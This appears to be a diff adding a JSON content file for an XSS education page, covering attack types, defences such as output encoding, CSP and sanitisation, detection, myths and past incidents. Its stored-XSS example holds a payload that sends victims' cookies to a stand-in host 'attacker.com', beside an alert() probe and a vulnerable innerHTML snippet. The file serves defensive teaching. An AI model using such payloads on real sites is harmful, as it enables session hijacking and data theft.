@@ -1,0 +1,248 @@
+{
+  "intro": {
+    "title": "XSS (Cross-Site Scripting) - Protect Your Users"
+  },
+  "whatIsXss": {
+    "title": "What is Cross-Site Scripting (XSS)?",
+    "text": "Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts (usually JavaScript) into web pages viewed by other users. When victims load the infected page, the malicious script executes in their browser, allowing the attacker to steal data, hijack sessions, or perform actions on behalf of the victim."
+  },
+  "whyIsItDangerous": {
+    "title": "Why is XSS dangerous?",
+    "risks": [
+      "Stealing session cookies and tokens (session hijacking)",
+      "Stealing sensitive data entered by users (passwords, credit cards)",
+      "Redirecting users to phishing or malware sites",
+      "Modifying page content seen by the victim",
+      "Performing actions on behalf of the victim (e.g., money transfers)",
+      "Installing keyloggers to capture all user input",
+      "Spreading worms that infect other users"
+    ]
+  },
+  "typesOfXss": {
+    "title": "Types of XSS Attacks",
+    "types": {
+      "reflectedXss": {
+        "name": "Reflected XSS (Non-Persistent)",
+        "description": "The malicious script is part of the request (e.g., URL parameter) and is immediately reflected back in the response. The attack is not stored on the server.",
+        "example": "URL: https://example.com/search?q=<script>alert('XSS')</script>",
+        "howItWorks": "Attacker sends victim a malicious link. When clicked, the script executes in victim's browser.",
+        "realWorldScenario": "Phishing emails with malicious links, social media posts with crafted URLs"
+      },
+      "storedXss": {
+        "name": "Stored XSS (Persistent)",
+        "description": "The malicious script is permanently stored on the server (database, files, logs) and executed every time users view the infected content.",
+        "example": "Comment field: <script>document.location='http://attacker.com?cookie='+document.cookie</script>",
+        "howItWorks": "Attacker posts malicious content (comment, profile, message). Every user viewing it gets infected.",
+        "realWorldScenario": "Forum posts, user profiles, blog comments, chat messages"
+      },
+      "domBasedXss": {
+        "name": "DOM-Based XSS",
+        "description": "The vulnerability exists in client-side JavaScript code that improperly handles user input. The malicious payload never reaches the server - it's processed entirely in the browser's DOM.",
+        "example": "JavaScript: document.getElementById('output').innerHTML = location.hash;",
+        "howItWorks": "JavaScript reads data from URL/DOM and inserts it into the page without sanitization.",
+        "realWorldScenario": "Single Page Applications (SPAs), client-side routing, dynamic content rendering"
+      }
+    }
+  },
+  "occurrenceConditions": {
+    "title": "Where XSS vulnerabilities occur",
+    "places": [
+      "Search fields that display the search term",
+      "Comment sections, forums, and chat applications",
+      "User profiles (name, bio, location)",
+      "Form fields that echo user input",
+      "URL parameters displayed on the page",
+      "Error messages containing user input",
+      "Any place where user input is rendered in HTML without sanitization"
+    ]
+  },
+  "typicalCodingMistakes": {
+    "title": "Typical coding mistakes leading to XSS",
+    "mistakes": [
+      "Directly inserting user input into HTML without encoding (innerHTML, document.write)",
+      "Not validating or sanitizing user input on server-side",
+      "Using dangerous JavaScript functions (eval, setTimeout with string)",
+      "Trusting client-side validation only",
+      "Not setting proper Content-Security-Policy headers",
+      "Improper use of template engines without auto-escaping",
+      "Reflecting URL parameters directly in HTML"
+    ]
+  },
+  "howToProtect": {
+    "title": "How to protect against XSS",
+    "description": "Below are best practices to prevent XSS attacks.",
+    "methods": {
+      "outputEncoding": {
+        "title": "Output encoding/escaping",
+        "description": "Always encode user data before inserting it into HTML, JavaScript, CSS, or URLs. This converts dangerous characters into safe representations.",
+        "encodingTypes": {
+          "htmlContext": {
+            "title": "HTML Context",
+            "description": "Encode: < > \" ' & into &lt; &gt; &quot; &#x27; &amp;",
+            "example": "User input: <script>alert('XSS')</script> → Displayed as: &lt;script&gt;alert('XSS')&lt;/script&gt;"
+          },
+          "javascriptContext": {
+            "title": "JavaScript Context",
+            "description": "Use JSON.stringify() for data in JavaScript, escape quotes and backslashes",
+            "example": "var userName = JSON.stringify(userInput); // Safe"
+          },
+          "urlContext": {
+            "title": "URL Context",
+            "description": "Use encodeURIComponent() for URL parameters",
+            "example": "var url = '/search?q=' + encodeURIComponent(userInput);"
+          },
+          "cssContext": {
+            "title": "CSS Context",
+            "description": "Avoid user input in CSS. If necessary, use strict validation and hex encoding",
+            "example": "Never allow user input in style attributes or CSS files"
+          }
+        }
+      },
+      "contentSecurityPolicy": {
+        "title": "Content Security Policy (CSP)",
+        "description": "CSP is an HTTP header that tells the browser which sources of content are trusted. It can block inline scripts and restrict where scripts can be loaded from.",
+        "recommendations": [
+          "Set CSP header: Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com",
+          "Disable inline scripts ('unsafe-inline') when possible",
+          "Use nonces or hashes for legitimate inline scripts",
+          "Report violations with report-uri directive"
+        ],
+        "example": "Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'; object-src 'none'"
+      },
+      "inputValidation": {
+        "title": "Input validation (defense-in-depth)",
+        "description": "Validate and sanitize all user input. Use allowlists for expected formats and reject unexpected data.",
+        "recommendations": [
+          "Validate data type and format (email, number, URL)",
+          "Use allowlists for known-good values",
+          "Reject input containing script tags or javascript: protocol",
+          "Limit input length to reasonable values",
+          "Validate on both client and server side (never trust client only)"
+        ]
+      },
+      "useFrameworksCorrectly": {
+        "title": "Use modern frameworks with auto-escaping",
+        "description": "Modern frameworks (React, Vue, Angular) automatically escape output by default. However, they can be bypassed if used incorrectly.",
+        "recommendations": [
+          "React: Avoid dangerouslySetInnerHTML - use only with sanitized HTML",
+          "Vue: Avoid v-html with user input",
+          "Angular: Avoid bypassSecurityTrust methods with user input",
+          "Always use framework's safe methods for rendering user content"
+        ]
+      },
+      "httpOnlyCookies": {
+        "title": "HTTPOnly and Secure cookie flags",
+        "description": "Protect session cookies from being stolen by XSS attacks.",
+        "recommendations": [
+          "Set HTTPOnly flag on session cookies (prevents JavaScript access)",
+          "Set Secure flag (cookies only sent over HTTPS)",
+          "Set SameSite attribute to prevent CSRF",
+          "Example: Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict"
+        ]
+      },
+      "sanitizeHtml": {
+        "title": "HTML sanitization for rich content",
+        "description": "If you must allow users to input HTML (rich text editors), use a trusted sanitization library to remove dangerous elements and attributes.",
+        "recommendations": [
+          "Use libraries like DOMPurify, Bleach, or OWASP Java HTML Sanitizer",
+          "Never write your own HTML sanitizer (it's extremely complex)",
+          "Configure sanitizer to allow only safe tags (p, b, i, a, img) and attributes",
+          "Remove all event handlers (onclick, onerror, onload)",
+          "Sanitize on server-side before storing in database"
+        ]
+      },
+      "avoidDangerousFunctions": {
+        "title": "Avoid dangerous JavaScript patterns",
+        "description": "Certain JavaScript functions and patterns can execute arbitrary code and should be avoided or used with extreme caution.",
+        "recommendations": [
+          "Never use eval() with user input",
+          "Avoid setTimeout/setInterval with string arguments",
+          "Don't use document.write() with user data",
+          "Be careful with innerHTML, outerHTML - prefer textContent or framework methods",
+          "Avoid new Function() with user input"
+        ]
+      },
+      "xssAuditing": {
+        "title": "Enable browser XSS protection",
+        "description": "Modern browsers have built-in XSS filters. Enable them with HTTP headers (though CSP is more powerful).",
+        "recommendations": [
+          "X-XSS-Protection: 1; mode=block (legacy, but still useful)",
+          "Prefer Content-Security-Policy over X-XSS-Protection",
+          "Note: Chrome removed XSS Auditor, so CSP is essential"
+        ]
+      }
+    }
+  },
+  "detectionAndMonitoring": {
+    "title": "Detection and Monitoring",
+    "description": "How to detect XSS attacks",
+    "points": [
+      "Monitor Content-Security-Policy violation reports",
+      "Log and analyze suspicious patterns in user input (script tags, event handlers)",
+      "Use Web Application Firewalls (WAF) to detect common XSS patterns",
+      "Implement anomaly detection for unusual JavaScript execution",
+      "Regular security scanning with tools (OWASP ZAP, Burp Suite)",
+      "Monitor for unexpected changes in stored content (comments, profiles)",
+      "Track unusual cookie access patterns"
+    ]
+  },
+  "secureCodePolicyExamples": {
+    "title": "Secure Code Policy Examples",
+    "description": "Rules for preventing XSS in development",
+    "points": [
+      "All user input must be encoded/escaped before display",
+      "Never use dangerouslySetInnerHTML, v-html, or bypassSecurityTrust without sanitization",
+      "Implement Content-Security-Policy on all pages",
+      "Set HTTPOnly and Secure flags on all authentication cookies",
+      "Use automated security testing in CI/CD pipeline",
+      "Code review must check for XSS vulnerabilities",
+      "Use static analysis tools (ESLint security plugins, SonarQube)"
+    ]
+  },
+  "commonMyths": {
+    "title": "Common Myths",
+    "description": "Misconceptions about XSS",
+    "points": [
+      "\"Client-side validation is enough\" - Attackers bypass client-side checks easily; always validate server-side",
+      "\"My framework handles everything\" - Frameworks help but can be bypassed with dangerous methods",
+      "\"Only <script> tags are dangerous\" - Event handlers (onerror, onload), javascript: URLs, and other vectors exist",
+      "\"HTMLencode() solves everything\" - Context matters; encoding for HTML doesn't work in JavaScript or URL contexts",
+      "\"WAF provides complete protection\" - WAF is a layer, not a replacement for secure coding"
+    ]
+  },
+  "realWorldExamples": {
+    "title": "Real-World XSS Attacks",
+    "description": "Famous XSS incidents",
+    "examples": [
+      {
+        "name": "Samy Worm (MySpace, 2005)",
+        "description": "First self-propagating XSS worm. Infected over 1 million MySpace users in 20 hours by adding Samy as a friend to every profile visited."
+      },
+      {
+        "name": "Twitter XSS (2010)",
+        "description": "Stored XSS in tweets caused automatic retweeting and redirects. Affected thousands of users including high-profile accounts."
+      },
+      {
+        "name": "British Airways (2018)",
+        "description": "XSS attack on payment page stole credit card data from 380,000 customers. Company fined £20 million."
+      },
+      {
+        "name": "eBay Persistent XSS (2015-2016)",
+        "description": "Stored XSS in product listings remained unpatched for months, allowing attackers to steal credentials."
+      }
+    ]
+  },
+  "summary": {
+    "title": "Summary",
+    "description": "Key takeaways",
+    "points": [
+      "XSS allows attackers to execute malicious JavaScript in victim's browser",
+      "Three main types: Reflected, Stored, and DOM-Based XSS",
+      "Always encode/escape user output based on context (HTML, JavaScript, URL, CSS)",
+      "Use Content-Security-Policy to restrict script sources",
+      "Set HTTPOnly and Secure flags on cookies",
+      "Use framework auto-escaping, avoid dangerous methods",
+      "Defense in depth: validation + encoding + CSP + HTTPOnly cookies + monitoring"
+    ]
+  }
+}
